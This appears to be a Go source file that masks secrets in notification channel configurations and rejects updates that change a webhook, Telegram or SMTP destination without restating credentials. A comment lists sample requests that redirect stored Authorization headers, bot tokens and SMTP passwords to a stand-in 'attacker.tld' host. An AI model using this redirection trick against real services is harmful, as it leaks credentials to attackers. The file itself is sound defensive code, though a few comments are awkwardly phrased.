package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix for masked values. When the API echoes credentials back, values with this prefix replace the real content,
// When the update interface receives a value with this prefix, it understands it as "keep the stored value unchanged".
//
// Using a prefix instead of an empty string or some fixed constant allows carrying a bit of recognizable information along.
// (see MaskedValue), letting users distinguish "which bot this is" without re-pasting the secret key.
const MaskedPrefix = "__masked__"

// MaskedValue generates a masked value:
//
//	"__masked__"              Original value too short, no hint given
//	"__masked__:...ab12cd"      carries the last 6 characters of the original value as an identification hint
//
// Exposing only the last 6 chars is deliberate: a Webhook address's identifying info sits at the tail (e.g. WeCom's key,
// ...Feishu bot IDs), while the prefix is identical across bots and has no identifying value. The last 6 digits are not enough to
// Without restoring credentials, yet enough for the operator to recognize "that's my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":..." + secret[len(secret)-6:]
}

// IsMasked reports whether a value is the masked value (i.e. unmodified since the API echoed it back).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config with that channel's credential fields replaced by the masked value.
//
// Unknown channel types return an empty map instead of the original config -- prefer letting the UI show "config unavailable",
// Nor should the possibly credential-bearing raw content be echoed back in full when the channel type is unrecognized.
// Non-credential fields stay as-is so the UI can display them.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures like headers are treated as a single credential as a whole: judging sub-key by sub-key would require each channel
		// Declaring yet another set of rules for "which sub-keys are credentials" would cost complexity far beyond its benefit.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials indicates "the destination address changed, but the caller has not ... for
// stance on credential fields". It is returned instead of silently passing or silently dropping credentials; see PrepareConfigUpdate for the rationale.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // Changed destination keys
	Missing []string // Credential keys with no explicit statement
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "target address (" + strings.Join(e.Changed, ", ") + ") changed, please re-enter the credential fields (" +
		strings.Join(e.Missing, ", ") + "): enter a new value, or leave explicitly empty to mean credentials are no longer needed." +
		"the original credential is only valid for the old address; continuing to use it amounts to handing it to the new address."
}

// PrepareConfigUpdate merges channel configuration and handles the security-sensitive case of "destination address change".
//
// It replaces bare MergeConfig on the channel-update path, solving a path verified feasible by actual testing:
// Destination address (where the message goes) and credentials (which identity sends it) are two independent field sets, while MergeConfig
// For "unmentioned keys", always keep the original stored values. So anyone able to PATCH the channel need only **change the address,
// saying nothing about credentials**, lets the server send the real stored credentials to an endpoint under their control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  -> the original Authorization header is sent out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} -> /bot<real Token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    -> hands over the username and password after STARTTLS
//
// This path is completely silent and does not rely on redirects (so rejecting cross-host jumps cannot stop it),
// And it would directly defeat this package's masking goal -- "credentials are never echoed back to the browser".
//
// Rule: whenever a destination key is changed to a new value, the caller must explicitly restate **every** credential key:
//   - new value given -> use the new value
//   - Explicitly passing an empty string -> this field no longer needs credentials (clear semantics preserved)
//
// - Passing the mask value back as-is / omitting the key entirely -> reject
//
// The third case is also rejected because the "masked value" means exactly "keep using the old credentials", and the old credentials
// Valid only for the old address. Deliberately no "auto-drop credentials" here -- for optional credential fields
// (the webhook's headers, the email's password) would silently become "authentication is gone but the API returns 200",
// Harder to troubleshoot than an error. Better to make the operator fill it in once more.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("Channel type %q not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (e.g. webhook's headers is an object) has a mask literal nested inside,
	// indicating the caller stuffed the "keep original value" sentinel inside the struct. MergeConfig only recognizes "string
	// ...with-prefix" as the mask; this shape would be stored verbatim as a plain object -- the literal ... actually lands in the store
	// "__masked__", and follow-up auth then fails silently with no error at all. Better to reject it.
	//
	// This check must come **first**: when the address is unchanged an early return is taken, placing it later amounts to
	// covering only the "address changed" path (that is exactly how v1 misplaced it, and the test caught it).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that were actually changed. A masked value means "unchanged".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// When the address is unchanged, do a normal merge (masked values keep the original, empty strings clear, everything else overwrites).
		return MergeConfig(stored, incoming), nil
	}

	// Address changed: every credential key needs an explicit statement.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submitting mask sentinels nested in non-string structures.
//
// The mask mechanism assumes "the whole value is a string". For object fields like webhook's headers,
// Can only be redacted as a whole (written as the string "__masked__") or submitted as a whole; stuffing the sentinel inside an object
// It cannot express "keep unchanged", and would instead be stored into the database as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("Field %s content contains mask marker %q: this field can only be left empty as a whole to mean reuse, or be submitted with a new value as a whole; mask placeholders cannot be embedded inside the struct",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares whether two config values are equivalent. Comparing via JSON serialization also handles
// Type difference -- the port submitted by the frontend is a number, while what is read back from the store is float64; a direct == misjudges.
//
// "Empty" must be normalized before comparison: empty string and "key absent" are the same state in this config model,
// Because MergeConfig treats empty strings as explicit clearing and deletes the key directly. Without normalization, a
// An always-empty optional destination field (Telegram's base_url is the only such field: empty means use
// ...official address) takes this path --
//
//	Stored as base_url:"" at creation -> key deleted by MergeConfig on first save
//	-> On the second save, incoming is "" and stored lacks the key, so it is misjudged as "address changed"
//
// -> credentials are the masked value -> 400 "destination address changed, please re-enter the credential fields as well"
//
// Every subsequent save would fail after that unless the user repastes the Bot Token, even though they changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue determines whether a config value counts as "empty".
// The criterion must be consistent with MergeConfig's emptiness check (strings.TrimSpace(s) == ""),
// Otherwise a gap appears where "MergeConfig thinks it should delete, sameConfigValue thinks there is a value".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, used for updating channel configs.
//
// Rules:
//   - Keys in incoming whose value is masked -> keep stored's original value (user didn't change this field)
//   - Keys whose value is an empty string in incoming -> treated as an explicit clear; delete the key
//
// - Remaining keys -> overwrite with incoming's values
//   - Keys present in stored but absent in incoming -> kept (partial-update semantics)
//
// Whether an empty string counts as "clearing" must be explicit: frontend forms submit unfilled fields as empty strings,
// Treating it as a real value on write would actually clear fields the user left blank to keep their original values.
// Explicit clearing is chosen here because, when clearing a misconfigured field, the user has no other way to express it
// (Dragging a field away can distinguish "not provided" from "provided an empty value", but the UI has no use for that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // Masked value = unmodified, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
